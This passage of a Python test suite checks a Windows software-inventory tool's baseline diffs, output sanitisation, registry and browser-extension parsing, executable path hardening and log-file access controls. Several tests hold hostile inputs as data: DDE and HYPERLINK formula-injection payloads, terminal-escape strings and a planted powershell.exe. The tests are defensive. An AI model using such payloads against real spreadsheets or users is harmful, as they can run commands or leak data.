        except Exception:
            pass

    def _make_software(self, name="TestApp", version="1.0"):
        return se.SoftwareInfo(
            name=name, version=version, publisher="Pub",
            install_date="2025-01-01", source="Registry",
            install_location="C:\\Apps"
        )

    def test_save_load_roundtrip(self):
        """Saved baseline should load back with identical software data."""
        original = [self._make_software("App1", "1.0"),
                    self._make_software("App2", "2.0")]
        se.BaselineManager.save_baseline(original, self.temp_file.name,
                                         sources=["registry"])
        loaded, metadata = se.BaselineManager.load_baseline(self.temp_file.name)
        self.assertEqual(len(loaded), 2)
        self.assertEqual(loaded[0].name, "App1")
        self.assertEqual(loaded[1].version, "2.0")
        self.assertEqual(metadata["software_count"], 2)

    def test_compare_detects_added(self):
        """compare() should detect newly installed software."""
        baseline = [self._make_software("App1")]
        current = [self._make_software("App1"), self._make_software("App2")]
        diff = se.BaselineManager.compare(baseline, current)
        self.assertEqual(len(diff.added), 1)
        self.assertEqual(diff.added[0].name, "App2")

    def test_compare_detects_removed(self):
        """compare() should detect uninstalled software."""
        baseline = [self._make_software("App1"), self._make_software("App2")]
        current = [self._make_software("App1")]
        diff = se.BaselineManager.compare(baseline, current)
        self.assertEqual(len(diff.removed), 1)
        self.assertEqual(diff.removed[0].name, "App2")

    def test_compare_detects_changed_version(self):
        """compare() should detect version changes."""
        baseline = [self._make_software("App1", "1.0")]
        current = [self._make_software("App1", "2.0")]
        diff = se.BaselineManager.compare(baseline, current)
        self.assertEqual(len(diff.changed), 1)
        self.assertEqual(diff.changed[0][0].version, "1.0")
        self.assertEqual(diff.changed[0][1].version, "2.0")

    def test_compare_no_changes(self):
        """compare() should report no changes for identical lists."""
        items = [self._make_software("App1", "1.0")]
        diff = se.BaselineManager.compare(items, list(items))
        self.assertFalse(diff.has_changes)


class TestParallelScanning(unittest.TestCase):
    """Test parallel source scanning via ThreadPoolExecutor."""

    def _make_software(self, name="App", source="registry"):
        return se.SoftwareInfo(
            name=name, version="1.0", publisher="Pub",
            install_date="2025-01-01", source=source,
            install_location="C:\\Apps"
        )

    @patch.object(se.PortableAppScanner, 'get_all_portable_apps')
    @patch.object(se.StoreAppScanner, 'get_store_apps')
    @patch.object(se.RegistryScanner, 'get_all_registry_software')
    def test_scan_all_collects_from_all_sources(self, mock_reg, mock_store, mock_portable):
        """scan_all should collect results from all three sources in parallel."""
        mock_reg.return_value = [self._make_software("RegApp", "registry")]
        mock_store.return_value = [self._make_software("StoreApp", "store")]
        mock_portable.return_value = [self._make_software("PortApp", "portable")]

        enumerator = se.SoftwareEnumerator()
        result = enumerator.scan_all(show_progress=False)

        self.assertEqual(len(result), 3)
        names = {s.name for s in result}
        self.assertEqual(names, {"RegApp", "StoreApp", "PortApp"})
        mock_reg.assert_called_once()
        mock_store.assert_called_once()
        mock_portable.assert_called_once()

    @patch.object(se.PortableAppScanner, 'get_all_portable_apps')
    @patch.object(se.StoreAppScanner, 'get_store_apps')
    @patch.object(se.RegistryScanner, 'get_all_registry_software')
    def test_scan_all_handles_single_source_error(self, mock_reg, mock_store, mock_portable):
        """If one scanner raises, others should still return results."""
        mock_reg.return_value = [self._make_software("RegApp", "registry")]
        mock_store.side_effect = RuntimeError("PowerShell not found")
        mock_portable.return_value = [self._make_software("PortApp", "portable")]

        enumerator = se.SoftwareEnumerator()
        result = enumerator.scan_all(show_progress=False)

        self.assertEqual(len(result), 2)
        names = {s.name for s in result}
        self.assertEqual(names, {"RegApp", "PortApp"})

    @patch.object(se.RegistryScanner, 'get_all_registry_software')
    def test_scan_all_single_source(self, mock_reg):
        """scan_all with a single source should work correctly."""
        mock_reg.return_value = [self._make_software("RegApp", "registry")]

        enumerator = se.SoftwareEnumerator()
        result = enumerator.scan_all(sources=["registry"], show_progress=False)

        self.assertEqual(len(result), 1)
        self.assertEqual(result[0].name, "RegApp")


class TestQuietMode(unittest.TestCase):
    """Test --quiet flag suppresses informational output."""

    def _make_software(self, name="TestApp"):
        return se.SoftwareInfo(
            name=name, version="1.0", publisher="Pub",
            install_date="2025-01-01", source="registry",
            install_location="C:\\Apps"
        )

    def test_display_table_quiet_suppresses_footer(self):
        """display_table with quiet=True should not print the total footer."""
        enumerator = se.SoftwareEnumerator()
        items = [self._make_software()]

        captured = io.StringIO()
        with patch('sys.stdout', captured):
            enumerator.display_table(items, quiet=True)

        output = captured.getvalue()
        self.assertNotIn("Total:", output)
        self.assertIn("TestApp", output)

    def test_display_table_normal_shows_footer(self):
        """display_table without quiet should print the total footer."""
        enumerator = se.SoftwareEnumerator()
        items = [self._make_software()]

        captured = io.StringIO()
        with patch('sys.stdout', captured):
            enumerator.display_table(items, quiet=False)

        output = captured.getvalue()
        self.assertIn("Total: 1 software items found.", output)


class TestCsvSanitizationConsistency(unittest.TestCase):
    """Test that CSV and JSON export use consistent sanitization."""

    def _make_software(self, name="Test\x1bApp"):
        return se.SoftwareInfo(
            name=name, version="1.0\x00", publisher="Pub\x07",
            install_date="2025-01-01", source="registry",
            install_location="C:\\Apps"
        )

    def test_csv_uses_sanitize_software_dict(self):
        """CSV export should produce same sanitized values as JSON export."""
        items = [self._make_software()]

        json_data = json.loads(se.SoftwareExporter.to_json(items))
        json_entry = json_data["software"][0]

        csv_output = se.SoftwareExporter.to_csv(items)
        reader = csv.DictReader(io.StringIO(csv_output))
        csv_entry = next(reader)

        for field in ["name", "version", "publisher", "install_date", "source", "install_location"]:
            self.assertEqual(csv_entry[field], json_entry[field],
                             f"Mismatch in field '{field}': CSV={csv_entry[field]!r}, JSON={json_entry[field]!r}")


class TestDiffExportSanitization(unittest.TestCase):
    """Baseline diff output (table, JSON, CSV) must sanitize every field.

    Removed entries and metadata come from a baseline file on disk, so they are untrusted.
    """

    EVIL = "Evil\rTrusted\x1b[2K‮"

    def _diff(self):
        evil = se.SoftwareInfo(name=self.EVIL, version="1.0\x1b[31m", publisher="Pub\nX",
                               install_date="2025\x07", source="Registry\x9b2J")
        good = se.SoftwareInfo(name="Good", version="2.0", publisher="P", source="Registry")
        good_new = se.SoftwareInfo(name="Good", version="2.1\r", publisher="P", source="Registry")
        return se.BaselineDiff(added=[evil], removed=[evil], changed=[(good, good_new)])

    def _assert_clean(self, text):
        for bad in ["\x1b", "\r", "‮", "\x07", "\x9b"]:
            self.assertNotIn(bad, text, f"found {bad!r}")

    def test_diff_csv_sanitizes_all_fields(self):
        out = se.BaselineManager.diff_to_csv(self._diff())
        rows = list(csv.reader(io.StringIO(out)))
        self.assertEqual(rows[0], ["change_type", "name", "baseline_version",
                                   "current_version", "publisher", "source"])
        self.assertEqual(len(rows), 4)
        for row in rows[1:]:
            for cell in row:
                self._assert_clean(cell)
                self.assertNotIn("\n", cell)
        self.assertEqual(rows[1][1], "Evil Trusted")

    def test_diff_json_sanitizes_all_fields_and_metadata(self):
        meta = {"created_at": "2026\x1b]0;x\x07", "hostname": "HOST\rFAKE"}
        data = json.loads(se.BaselineManager.diff_to_json(self._diff(), meta, "base.json"))
        self.assertEqual(data["summary"]["total_changes"], 3)
        self.assertEqual(data["metadata"]["baseline_hostname"], "HOST FAKE")
        self.assertEqual(data["metadata"]["baseline_created"], "2026")
        for entry in data["added"] + data["removed"]:
            for value in entry.values():
                self._assert_clean(value)
                self.assertNotIn("\n", value)
        self.assertEqual(data["changed"][0]["current"]["version"], "2.1 ")

    def test_display_diff_sanitizes_metadata(self):
        meta = {"created_at": "2026\x1b[2J", "hostname": "HOST\rFAKE", "software_count": 0}
        buf = io.StringIO()
        with patch("sys.stdout", buf):
            se.BaselineManager.display_diff(self._diff(), meta)
        out = buf.getvalue()
        self._assert_clean(out)
        self.assertIn("Baseline host: HOST FAKE", out)
        self.assertIn("Baseline software count: 0", out)  # 0 is a real value, not "unknown"


class TestCsvFormulaInjection(unittest.TestCase):
    """CSV exports must not carry cells that spreadsheet apps run as formulas."""

    PAYLOADS = [
        '=HYPERLINK("http://x.invalid/?"&A1,"Click")',
        "=cmd|' /C calc'!A0",          # DDE
        "+1+cmd|' /C calc'!A0",
        "-2+3",
        "@SUM(A1:A9)",
        "\t=1+1",                       # TAB becomes a space during sanitizing
        "\r=1+1",                       # so does CR
        "  =1+1",                       # leading whitespace is ignored by the check
    ]

    def _rows(self, csv_text):
        return list(csv.DictReader(io.StringIO(csv_text)))

    def test_csv_safe_cell_neutralises_each_prefix(self):
        for payload in self.PAYLOADS:
            cell = se.csv_safe_cell(payload)
            self.assertTrue(cell.startswith("'"), f"not neutralised: {payload!r} -> {cell!r}")
            self.assertEqual(cell[1:], se.sanitize_output(payload))

    def test_ordinary_values_unchanged(self):
        for value in ["Google Chrome", "A, B & C", 'App "Pro"', "a=b", "1.2.3",
                      "C:\\Program Files\\App", "", "Notepad++"]:
            self.assertEqual(se.csv_safe_cell(value), value)

    def test_none_becomes_empty_cell(self):
        self.assertEqual(se.csv_safe_cell(None), "")

    def test_to_csv_guards_every_field(self):
        sw = se.SoftwareInfo(name="=1+1", version="-1", publisher="@evil", install_date="+2",
                             source="=src", install_location="=C:\\x")
        row = self._rows(se.SoftwareExporter.to_csv([sw]))[0]
        for field, value in row.items():
            self.assertTrue(value.startswith("'"), f"{field} not neutralised: {value!r}")

    def test_to_csv_round_trip_keeps_value_readable(self):
        payload = '=HYPERLINK("http://x.invalid/?"&A1,"Click")'
        row = self._rows(se.SoftwareExporter.to_csv([se.SoftwareInfo(name=payload)]))[0]
        self.assertEqual(row["name"], "'" + payload)

    def test_diff_csv_guards_every_field(self):
        evil = se.SoftwareInfo(name="=1+1", version="+1", publisher="@p", source="-s")
        old = se.SoftwareInfo(name="=App", version="=1", publisher="@p", source="-s")
        new = se.SoftwareInfo(name="=App", version="=2", publisher="@p", source="-s")
        diff = se.BaselineDiff(added=[evil], removed=[evil], changed=[(old, new)])
        rows = list(csv.reader(io.StringIO(se.BaselineManager.diff_to_csv(diff))))
        for row in rows[1:]:
            for cell in row[1:]:                       # row[0] is our own change_type label
                if cell:
                    self.assertTrue(cell.startswith("'"), f"not neutralised: {cell!r}")


class _FakeRegistry:
    """Minimal winreg stand-in: {subkey_name: {value_name: value}} under a single path.

    A value that is an Exception instance is raised when read.
    """

    FUNCS = ("OpenKey", "QueryInfoKey", "EnumKey", "QueryValueEx", "CloseKey")

    def __init__(self, entries):
        self.entries = entries
        self.names = list(entries)

    def OpenKey(self, hive, path, *args):
        return path                                   # a "key" is just its path

    def QueryInfoKey(self, key):
        return (len(self.names), 0, 0)

    def EnumKey(self, key, i):
        return self.names[i]

    def QueryValueEx(self, key, value_name):
        values = self.entries[key.rsplit("\\", 1)[-1]]
        if value_name not in values:
            raise FileNotFoundError(value_name)
        value = values[value_name]
        if isinstance(value, Exception):
            raise value
        return value, 0

    def CloseKey(self, key):
        pass

    def scan(self, scanner=None):
        """Run RegistryScanner.scan_registry_key against this fake; returns (scanner, results)."""
        import contextlib
        scanner = scanner or se.RegistryScanner()
        with contextlib.ExitStack() as stack:
            for name in self.FUNCS:
                stack.enter_context(patch.object(se.winreg, name, getattr(self, name)))
            results = scanner.scan_registry_key(se.winreg.HKEY_CURRENT_USER, r"SOFTWARE\Uninstall")
        return scanner, results

    def scan_all(self):
        """Run get_all_registry_software with a single registry path pointing at this fake."""
        import contextlib
        scanner = se.RegistryScanner()
        with contextlib.ExitStack() as stack:
            for name in self.FUNCS:
                stack.enter_context(patch.object(se.winreg, name, getattr(self, name)))
            stack.enter_context(patch.object(se.RegistryScanner, "REGISTRY_PATHS",
                                             [(se.winreg.HKEY_CURRENT_USER, r"SOFTWARE\Uninstall")]))
            results = scanner.get_all_registry_software()
        return scanner, results


class TestRegistryMalformedValues(unittest.TestCase):
    """A malformed registry value must not hide software or abort the scan.

    Any process can write under HKCU, so a REG_DWORD InstallDate used to make the whole
    registry source return nothing.
    """

    GOOD = {"DisplayName": "Good App", "DisplayVersion": "2.0", "Publisher": "Good Inc"}

    def _by_name(self, results):
        return {s.name: s for s in results}

    def test_dword_install_date_is_converted_not_fatal(self):
        reg = _FakeRegistry({"evil": {"DisplayName": "Evil", "InstallDate": 20240101},
                             "good": self.GOOD})
        scanner, results = reg.scan()
        found = self._by_name(results)
        self.assertEqual(set(found), {"Evil", "Good App"})
        self.assertEqual(found["Evil"].install_date, "2024-01-01")
        self.assertEqual(scanner.converted_values, 1)

    def test_dword_display_version_becomes_text(self):
        _, results = _FakeRegistry({"a": {"DisplayName": "App", "DisplayVersion": 123}}).scan()
        self.assertEqual(results[0].version, "123")

    def test_binary_display_name_is_decoded(self):
        raw = "Evil App".encode("utf-16-le") + b"\x00\x00"
        _, results = _FakeRegistry({"a": {"DisplayName": raw}}).scan()
        self.assertEqual(results[0].name, "Evil App")

    def test_multi_sz_is_joined(self):
        _, results = _FakeRegistry({"a": {"DisplayName": "App", "Publisher": ["Part A", "Part B"]}}).scan()
        self.assertEqual(results[0].publisher, "Part A Part B")

    def test_all_fields_are_strings(self):
        _, results = _FakeRegistry({"a": {"DisplayName": 7, "DisplayVersion": 1, "Publisher": b"",
                                          "InstallDate": [], "InstallLocation": 0}}).scan()
        for field in ("name", "version", "publisher", "install_date", "install_location"):
            self.assertIsInstance(getattr(results[0], field), str, field)

    def test_system_component_int_or_string_is_skipped(self):
        reg = _FakeRegistry({"int": {"DisplayName": "Hidden1", "SystemComponent": 1},
                             "str": {"DisplayName": "Hidden2", "SystemComponent": "1"},
                             "zero": {"DisplayName": "Shown", "SystemComponent": 0}})
        scanner, results = reg.scan()
        self.assertEqual([s.name for s in results], ["Shown"])
        self.assertEqual(scanner.converted_values, 0)   # DWORD is the normal type for this flag

    def test_unparseable_entry_skipped_others_kept(self):
        reg = _FakeRegistry({"bad": {"DisplayName": TypeError("boom")}, "good": self.GOOD})
        scanner, results = reg.scan()
        self.assertEqual([s.name for s in results], ["Good App"])
        self.assertEqual(scanner.unreadable_entries, 1)

    def test_scan_warns_once_on_anomalies(self):
        reg = _FakeRegistry({"a": {"DisplayName": "A", "InstallDate": 20240101},
                             "b": {"DisplayName": "B", "DisplayVersion": 5}})
        with self.assertLogs(se.logger, level="WARNING") as logs:
            _, results = reg.scan_all()
        self.assertEqual(len(results), 2)
        self.assertEqual(len(logs.records), 1)
        self.assertIn("2 registry value(s)", logs.output[0])

    def test_normal_registry_produces_no_warning(self):
        with self.assertNoLogs(se.logger, level="WARNING"):
            _, results = _FakeRegistry({"good": self.GOOD}).scan_all()
        self.assertEqual(len(results), 1)


class TestBrowserMalformedInput(unittest.TestCase):
    """Malformed browser files must not crash the extension scan."""

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self.scanner = se.BrowserExtensionScanner()

    def tearDown(self):
        self.tmp.cleanup()

    def _manifest(self, content, ext_dir=None):
        ext_dir = ext_dir or self.dir
        ext_dir.mkdir(parents=True, exist_ok=True)
        path = ext_dir / "manifest.json"
        if isinstance(content, (bytes, str)):
            path.write_bytes(content if isinstance(content, bytes) else content.encode("utf-8"))
        else:
            path.write_text(json.dumps(content), encoding="utf-8")
        return path

    def _firefox(self, data):
        path = self.dir / "extensions.json"
        path.write_text(data if isinstance(data, str) else json.dumps(data), encoding="utf-8")
        return self.scanner._parse_firefox_extensions_json(path)

    # --- Chromium ---------------------------------------------------------------

    def test_chromium_non_string_name_is_converted(self):
        ext = self.scanner._parse_chromium_manifest(self._manifest({"name": 123, "version": 2}), "id", "Chrome")
        self.assertEqual((ext.name, ext.version), ("123", "2"))

    def test_chromium_bad_content_scripts_entries_are_ignored(self):
        path = self._manifest({"name": "X", "content_scripts": ["oops", {"matches": ["<all_urls>"]}, {"matches": 5}]})
        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
        self.assertEqual(ext.permissions, ["<all_urls>"])
        self.assertTrue(ext.has_sensitive_permissions())

    def test_chromium_permission_list_items_are_strings(self):
        path = self._manifest({"name": "X", "permissions": [{"fileSystem": ["write"]}, 5, None, "tabs"],
                               "host_permissions": "not-a-list"})
        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
        self.assertEqual(ext.permissions, ["fileSystem", "5", "tabs"])
        ext.has_sensitive_permissions()   # must not raise

    def test_chromium_non_object_manifest_returns_none(self):
        self.assertIsNone(self.scanner._parse_chromium_manifest(self._manifest([1, 2]), "id", "Chrome"))

    def test_chromium_deeply_nested_manifest_returns_none(self):
        path = self._manifest("[" * 100000 + "]" * 100000)
        self.assertIsNone(self.scanner._parse_chromium_manifest(path, "id", "Chrome"))

    def test_localized_name_with_invalid_utf8_falls_back(self):
        path = self._manifest({"name": "__MSG_appName__"})
        loc = self.dir / "_locales" / "en"
        loc.mkdir(parents=True)
        (loc / "messages.json").write_bytes(b'{"appName": {"message": "\xff\xfe"}}')
        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
        self.assertEqual(ext.name, "__MSG_appName__")

    def test_localized_name_with_wrong_types_falls_back(self):
        path = self._manifest({"name": "__MSG_appName__"})
        for locale, content in [("en", ["list"]), ("en_US", {"appName": "just a string"}),
                                ("en_GB", {"appName": {"message": 5}})]:
            loc = self.dir / "_locales" / locale
            loc.mkdir(parents=True)
            (loc / "messages.json").write_text(json.dumps(content), encoding="utf-8")
        ext = self.scanner._parse_chromium_manifest(path, "id", "Chrome")
        self.assertEqual(ext.name, "__MSG_appName__")

    def test_chromium_dir_scan_keeps_good_extensions(self):
        self._manifest({"name": 999}, self.dir / "Extensions" / "badext" / "1.0_0")
        self._manifest({"name": "Good"}, self.dir / "Extensions" / "goodext" / "1.0_0")
        found = self.scanner._scan_chromium_extensions_dir(self.dir / "Extensions", "Chrome")
        self.assertEqual(sorted(e.name for e in found), ["999", "Good"])

    # --- Firefox ----------------------------------------------------------------

    def test_firefox_null_user_permissions(self):
        exts = self._firefox({"addons": [{"type": "extension", "id": "a@b",
                                          "defaultLocale": {"name": "A"}, "userPermissions": None}]})
        self.assertEqual([(e.name, e.permissions) for e in exts], [("A", [])])

    def test_firefox_null_default_locale_falls_back_to_id(self):
        exts = self._firefox({"addons": [{"type": "extension", "id": "a@b", "defaultLocale": None}]})
        self.assertEqual(exts[0].name, "a@b")

    def test_firefox_bad_entry_does_not_drop_others(self):
        exts = self._firefox({"addons": ["not-an-object", 42,
                                         {"type": "extension", "id": "good@x", "active": "yes",
                                          "defaultLocale": {"name": "Good"}}]})
        self.assertEqual([e.name for e in exts], ["Good"])
        self.assertTrue(exts[0].enabled)

    def test_firefox_wrong_top_level_shapes(self):
        self.assertEqual(self._firefox([1, 2]), [])
        self.assertEqual(self._firefox({"addons": "nope"}), [])
        self.assertEqual(self._firefox("[" * 100000 + "]" * 100000), [])


class TestExecutableResolution(unittest.TestCase):
    """External programs are launched by absolute path, never by bare name."""

    def _ok_result(self, stdout=""):
        result = MagicMock()
        result.stdout, result.returncode = stdout, 0
        return result

    def test_system_dir_comes_from_os_not_environment(self):
        real = se._system_dir()
        with patch.dict(os.environ, {"SystemRoot": r"C:\Planted", "windir": r"C:\Planted"}):
            self.assertEqual(se._system_dir(), real)
        self.assertTrue((real / "kernel32.dll").is_file())

    def test_powershell_path_is_absolute_in_system_dir(self):
        ps = se._powershell_path()
        self.assertTrue(ps.is_absolute())
        self.assertEqual(ps.parent.parent.parent, se._system_dir())
        self.assertEqual(ps.name.lower(), "powershell.exe")

    def test_store_scanner_runs_absolute_powershell(self):
        with patch("subprocess.run", return_value=self._ok_result('"Name"\n')) as run:
            se.StoreAppScanner().get_store_apps()
        cmd = run.call_args[0][0]
        self.assertEqual(cmd[0], str(se._powershell_path()))

    def test_winget_path_comes_from_localappdata(self):
        with tempfile.TemporaryDirectory() as tmp:
            alias = Path(tmp) / "Microsoft" / "WindowsApps" / "winget.exe"
            alias.parent.mkdir(parents=True)
            alias.write_bytes(b"")
            with patch.dict(os.environ, {"LOCALAPPDATA": tmp}):
                self.assertEqual(se._winget_path(), alias)

    def test_winget_runs_absolute_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / "winget.exe"
            fake.write_bytes(b"")
            with patch.object(se, "_winget_path", return_value=fake), \
                 patch("subprocess.run", return_value=self._ok_result()) as run:
                se.WingetUpdateChecker().check_for_updates()
        self.assertEqual(run.call_args[0][0][0], str(fake))

    def test_missing_winget_never_falls_back_to_bare_name(self):
        captured = io.StringIO()
        with patch.object(se, "_winget_path", return_value=None), \
             patch("subprocess.run") as run, patch("sys.stderr", captured):
            self.assertEqual(se.WingetUpdateChecker().check_for_updates(), [])
        run.assert_not_called()
        self.assertIn("winget not found", captured.getvalue())

    def test_harden_environment_sets_flag_without_overriding(self):
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("NoDefaultCurrentDirectoryInExePath", None)
            se._harden_process_environment()
            self.assertEqual(os.environ["NoDefaultCurrentDirectoryInExePath"], "1")
            os.environ["NoDefaultCurrentDirectoryInExePath"] = "keep"
            se._harden_process_environment()
            self.assertEqual(os.environ["NoDefaultCurrentDirectoryInExePath"], "keep")

    def test_main_hardens_environment_first(self):
        with patch.object(se, "_harden_process_environment") as harden, \
             patch.object(se, "WingetUpdateChecker") as checker, \
             patch.object(sys, "argv", ["Software_Enumerator.py", "--check-updates", "--quiet"]), \
             patch.object(se, "setup_logging"), patch.object(se, "_load_env_file"):
            checker.return_value.check_for_updates.return_value = []
            se.main()
        harden.assert_called_once()

    def test_planted_powershell_in_cwd_is_not_run(self):
        """Integration: a copy of hostname.exe named powershell.exe in the CWD, with CWD search
        enabled, must not be what the tool runs. Self-checking: skipped if planting can't work here."""
        import shutil
        hostname_exe = se._system_dir() / "hostname.exe"
        if not hostname_exe.is_file():
            self.skipTest("hostname.exe not available")
        repo_dir = str(Path(se.__file__).resolve().parent)
        probe = (
            "import subprocess, sys\n"
            f"sys.path.insert(0, {repo_dir!r})\n"
            "import Software_Enumerator as se\n"
            "args = ['-NoProfile', '-Command', 'echo REAL']\n"
            "bare = subprocess.run(['powershell'] + args, capture_output=True, text=True).stdout.strip()\n"
            "fixed = subprocess.run([str(se._powershell_path())] + args, capture_output=True, text=True).stdout.strip()\n"
            "print(repr(bare)); print(repr(fixed))\n"
        )
        env = {k: v for k, v in os.environ.items() if k.lower() != "nodefaultcurrentdirectoryinexepath"}
        with tempfile.TemporaryDirectory() as tmp:
            shutil.copy(hostname_exe, Path(tmp) / "powershell.exe")
            out = subprocess_run_text([sys.executable, "-c", probe], cwd=tmp, env=env)
        import ast  # literal_eval, not eval: the output includes what a planted binary printed
        bare, fixed = [ast.literal_eval(line) for line in out.splitlines()[-2:]]
        if bare == "REAL":
            self.skipTest("current-directory search is not active in this environment")
        self.assertEqual(fixed, "REAL", "absolute path must run the real PowerShell")


class TestLogFilePermissions(unittest.TestCase):
    """Log files are really restricted to their owner (and SYSTEM) on Windows.

    os.chmod(0o600) used to be the only protection, and on Windows it changes nothing.
    """

    OWNER_ONLY_ACES = {"(A;;FA;;;OW)", "(A;;FA;;;SY)"}

    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self.tmp.name)
        self._saved_handlers = list(se.logger.handlers)

    def tearDown(self):
        for h in list(se.logger.handlers):
            if h not in self._saved_handlers:
                h.close()
        se.logger.handlers = self._saved_handlers
        self.tmp.cleanup()

    @staticmethod
    def _dacl(path):
        """The file's DACL as SDDL, via icacls /save (UTF-16LE without BOM, not localized)."""
        import re
        import subprocess
        out = Path(tempfile.mkdtemp()) / "acl.txt"
        try:
            subprocess.run([str(se._system_dir() / "icacls.exe"), str(path), "/save", str(out)],
                           capture_output=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
            dacl = out.read_text(encoding="utf-16-le").splitlines()[1]
        finally:
            out.unlink(missing_ok=True)
            out.parent.rmdir()
        return dacl, set(re.findall(r"\([^)]*\)", dacl))

    def _assert_owner_only(self, path):
        dacl, aces = self._dacl(path)
        self.assertTrue(dacl.startswith("D:P"), f"DACL not protected from inheritance: {dacl}")
        self.assertEqual(aces, self.OWNER_ONLY_ACES, f"unexpected entries: {dacl}")

    def _flush(self):
        for h in se.logger.handlers:
            h.flush()

    def test_setup_logging_creates_owner_only_file(self):
        log = self.dir / "audit.log"
        se.setup_logging(log_file=str(log))
        se.log_audit_event("TEST", "hello")
        self._flush()
        self._assert_owner_only(log)
        self.assertIn("hello", log.read_text(encoding="utf-8"))   # owner can still write and read

    def test_existing_explicit_grant_is_removed(self):
        import subprocess
        log = self.dir / "audit.log"
        log.write_text("old\n", encoding="utf-8")
        subprocess.run([str(se._system_dir() / "icacls.exe"), str(log), "/grant", "*S-1-1-0:R"],  # Everyone:R
                       capture_output=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
        self.assertIn("(A;;FR;;;WD)", self._dacl(log)[1])
        se.setup_logging(log_file=str(log))
        self._assert_owner_only(log)

    def test_rotated_files_are_owner_only(self):
        log = self.dir / "rot.log"
        handler = se._RestrictedRotatingFileHandler(log, maxBytes=200, backupCount=2, encoding="utf-8")
        test_logger = logging.getLogger("test_rotation_acl")
        test_logger.addHandler(handler)
        try:
            for i in range(30):
                test_logger.warning("line %03d padding padding padding", i)
        finally:
            test_logger.removeHandler(handler)
            handler.close()
        for path in (log, Path(f"{log}.1"), Path(f"{log}.2")):
            self.assertTrue(path.exists(), path)
            self._assert_owner_only(path)

    def test_setup_logging_uses_restricted_handler(self):
        se.setup_logging(log_file=str(self.dir / "a.log"))
        handlers = [h for h in se.logger.handlers if isinstance(h, se._RestrictedRotatingFileHandler)]
        self.assertEqual(len(handlers), 1)

    def test_failure_warns_once_and_logging_continues(self):
        """A drive without access-list support (FAT32/exFAT): new files and every rollover
        are unprotected, so warn once and keep logging."""
        log = self.dir / "fail.log"
        captured = io.StringIO()
        with patch.object(se, "_volume_supports_acls", return_value=False), \
             patch("sys.stderr", captured):
            handler = se._RestrictedRotatingFileHandler(log, maxBytes=200, backupCount=2, encoding="utf-8")
            test_logger = logging.getLogger("test_acl_failure")
            test_logger.addHandler(handler)
            try:
                for i in range(30):                    # several rollovers, each calls _open()
                    test_logger.warning("line %03d padding padding padding", i)
            finally:
                test_logger.removeHandler(handler)
                handler.close()
        self.assertEqual(captured.getvalue().count("could not restrict log file permissions"), 1)
        self.assertIn("line 029", log.read_text(encoding="utf-8"))

    def test_new_file_on_drive_without_acls_warns(self):
        """FAT32/exFAT silently ignore the access list requested at creation, so a brand-new
        log there must still produce the warning."""
        captured = io.StringIO()
        with patch.object(se, "_volume_supports_acls", return_value=False), patch("sys.stderr", captured):
            se.setup_logging(log_file=str(self.dir / "fat.log"))
        self.assertEqual(captured.getvalue().count("could not restrict log file permissions"), 1)

    def test_restrict_handle_to_owner_raises_oserror_for_bad_handle(self):
        with self.assertRaises(OSError):
            se._restrict_handle_to_owner(0)

    # --- Files that already exist (pre-created by someone else, or linked) ---------------

    FOREIGN_SID = "S-1-5-21-1000000000-2000000000-3000000000-1001"

    def test_new_file_is_restricted_at_creation(self):
        """A new log gets the access list when it is created, not afterwards."""
        log = self.dir / "new.log"
        with patch.object(se, "_restrict_handle_to_owner") as after_open:
            se.setup_logging(log_file=str(log))
        after_open.assert_not_called()
        self._assert_owner_only(log)

    def test_open_log_handle_never_creates_over_existing_file(self):
        log = self.dir / "exists.log"
        log.write_text("someone else's\n", encoding="utf-8")
        handle, created = se._open_log_handle(str(log))
        se._win32().close_handle(handle)
        self.assertFalse(created)
        self.assertEqual(log.read_text(encoding="utf-8"), "someone else's\n")

    def test_log_is_never_reopened_by_path(self):
        """The stream must wrap the handle we created or checked, not a second open by name."""
        log = self.dir / "audit.log"
        with patch.object(logging.FileHandler, "_open", side_effect=AssertionError("reopened by path")):
            se.setup_logging(log_file=str(log))
            se.log_audit_event("TEST", "through the handle")
            self._flush()
        self.assertIn("through the handle", log.read_text(encoding="utf-8"))

    def test_open_log_cannot_be_swapped_or_its_folder_renamed(self):
        """While the log is open, nobody can replace/delete it or rename its folder, so it
        can't be swapped (e.g. for a directory junction to someone else's folder)."""
        logs = self.dir / "logs"
        logs.mkdir()
        log = logs / "audit.log"
        se.setup_logging(log_file=str(log))
        other = self.dir / "attacker.log"
        other.write_text("attacker\n", encoding="utf-8")
        for label, action in (("replace", lambda: os.replace(other, log)),
                              ("delete", lambda: os.remove(log)),
                              ("rename folder", lambda: os.rename(logs, self.dir / "moved"))):
            with self.assertRaises(PermissionError, msg=label):
                action()
        se.log_audit_event("TEST", "still ours")
        self._flush()
        self.assertIn("still ours", log.read_text(encoding="utf-8"))

    def test_reparse_point_is_refused(self):
        """A symlink is opened as itself (not followed) and recognised by its reparse attribute.
        Simulated, since creating a real symlink needs admin or Developer Mode."""
        log = self.dir / "audit.log"
        log.write_text("x\n", encoding="utf-8")
        real_fstat = os.fstat

        class _Stat:
            def __init__(self, st):
                self.st_nlink = st.st_nlink
                self.st_file_attributes = st.st_file_attributes | stat.FILE_ATTRIBUTE_REPARSE_POINT

        with patch.object(se.os, "fstat", lambda fd: _Stat(real_fstat(fd))):
            with self.assertRaises(se.LogFileOwnershipError) as ctx:
                se.setup_logging(log_file=str(log))
        self.assertIn("reparse point", str(ctx.exception))

    def test_access_denied_on_foreign_file_explains_ownership(self):
        log = self.dir / "audit.log"
        log.write_text("x\n", encoding="utf-8")
        with patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
            with self.assertRaises(se.LogFileOwnershipError):
                se._raise_if_owned_by_another_account(str(log))
        se._raise_if_owned_by_another_account(str(log))   # our own file: no exception

    def test_file_owned_by_another_account_is_refused(self):
        log = self.dir / "audit.log"
        log.write_text("pre-created\n", encoding="utf-8")
        dacl_before = self._dacl(log)[0]
        with patch.object(se, "_handle_owner_sid", return_value=self.FOREIGN_SID):
            with self.assertRaises(se.LogFileOwnershipError) as ctx:
                se.setup_logging(log_file=str(log))
        self.assertIn("owned by another account", str(ctx.exception))
